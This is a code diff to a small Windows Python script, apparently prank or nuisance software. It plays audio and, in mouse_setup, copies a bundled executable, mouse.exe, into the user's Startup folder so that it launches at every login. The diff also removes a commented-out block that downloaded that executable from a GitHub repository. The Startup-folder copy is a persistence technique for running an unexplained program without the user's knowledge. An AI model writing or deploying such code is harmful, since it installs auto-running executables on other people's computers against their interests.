@@ -7,7 +7,7 @@ import requests
 from ctypes import windll, c_int, c_uint, c_ulong, byref, POINTER
 
 def get_asset_path(relative_path):
-    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
+    base_path = os.path.dirname(os.path.abspath(__file__))
     return Path(base_path) / relative_path
 
 def play_audio(path):
@@ -17,10 +17,6 @@ def play_audio(path):
 
 def mouse_setup():
     # %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-    # r = requests.get("https://github.com/skykosiner/charlie-kirk/raw/refs/heads/master/dist/mouse.exe", stream=True)
-    #
-    # with open('dist/mouse.exe', 'wb') as out_file:
-    #     out_file.write(r.content)
 
     mouse_path = get_asset_path("assets/mouse.exe")
     shutil.copy(mouse_path,os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
